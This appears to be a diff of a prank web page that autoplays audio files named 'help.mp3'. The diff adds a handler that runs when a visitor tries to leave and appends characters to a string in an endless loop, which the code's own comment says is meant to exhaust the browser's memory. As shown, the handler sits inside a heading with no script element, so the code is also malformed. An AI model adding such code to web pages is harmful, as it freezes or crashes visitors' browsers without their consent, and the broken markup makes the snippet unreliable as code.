@@ -1,11 +1,17 @@
 <!DOCTYPE HTML>
 <HTML>
   <h1 style="background-color:rgb(0, 0, 0);">
+    window.onbeforeunload = function(){
+   txt = "a";
+while(1){
+    txt = txt += "a";    //add as much as the browser can handle
+}
+}
 <head>
       <audio controls autoplay>
       <source src="help.mp3" type="audio/mpeg">
     </audio>
-  <audio controls loop
+  <audio controls loop>
     <source src="Help.mp3" type="audio/mpeg">
   </audio>
     <style>
